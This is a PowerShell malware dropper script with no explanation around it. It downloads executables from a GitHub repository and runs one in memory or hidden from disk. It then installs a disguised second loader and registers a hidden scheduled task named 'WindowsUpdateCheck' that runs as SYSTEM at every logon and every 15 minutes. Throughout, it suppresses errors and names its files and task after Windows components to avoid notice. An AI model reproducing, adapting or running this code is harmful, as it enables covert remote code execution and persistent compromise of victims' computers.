# ==========================================
# SILENT FINAL DEPLOY (Same Logic - No Output)
# ==========================================

# SUPPRESS ALL OUTPUT
$ErrorActionPreference = 'SilentlyContinue'

# --- CONFIGURATION ---
$PayloadUrl = 'https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/WmiPrvSE.exe'
$LoaderUrl  = 'https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/SearchIndex.exe'
$LoaderPath = "$env:APPDATA\Microsoft\Windows\Templates\SearchIndex.exe"
$TaskName   = "WindowsUpdateCheck"

# --- 1. CLEANUP (Remove Old Traces) ---
Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
Remove-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
Stop-Process -Name "mshta" -Force -ErrorAction SilentlyContinue

# --- 2. EXECUTION (Same Logic - Silent) ---
function Run-Payload {
    try {
        $bytes = (New-Object Net.WebClient).DownloadData($PayloadUrl)
    } catch { return }

    # Attempt 1: Load directly into RAM (Fileless)
    try {
        $assembly = [System.AppDomain]::CurrentDomain.Load($bytes)
        $assembly.EntryPoint.Invoke($null, $null)
        return
    } catch {}

    # Attempt 2: Drop to Disk (Hidden) and Run
    try {
        $path = "$env:APPDATA\Microsoft\Windows\Templates\WmiPrvSE.exe"
        [IO.File]::WriteAllBytes($path, $bytes)
        Start-Process $path -WindowStyle Hidden
    } catch {}
}

# --- 3. PERSISTENCE (Same Logic - Silent) ---
try {
    # A. Download the C++ Loader
    try {
        $wc = New-Object Net.WebClient
        $wc.DownloadFile($LoaderUrl, $LoaderPath)
    } catch {}

    # B. Register Task via COM Object
    $service = New-Object -ComObject Schedule.Service
    $service.Connect()
    $rootFolder = $service.GetFolder("\")
    
    # Delete old task first
    try { $rootFolder.DeleteTask($TaskName, 0) } catch {}
    
    # Define Task (EXACT SAME)
    $taskDef = $service.NewTask(0)
    $taskDef.RegistrationInfo.Description = "System Integrity Check"
    $taskDef.Settings.Enabled = $true
    $taskDef.Settings.Hidden = $true
    $taskDef.Settings.MultipleInstances = 2
    $taskDef.Settings.DisallowStartIfOnBatteries = $false
    $taskDef.Settings.StopIfGoingOnBatteries = $false
    
    # Create Trigger (Logon + 15 Min Infinite Loop)
    $trigger = $taskDef.Triggers.Create(9)
    $trigger.Id = "LogonTrigger"
    $trigger.Enabled = $true
    $trigger.Repetition.Interval = "PT15M"
    
    # Create Action
    $action = $taskDef.Actions.Create(0)
    $action.Path = $LoaderPath
    
    # Register Task (FIXED: SYSTEM user)
    $rootFolder.RegisterTaskDefinition($TaskName, $taskDef, 6, "SYSTEM", $null, 4) | Out-Null
    
} catch {}

# --- 4. START ---
Run-Payload
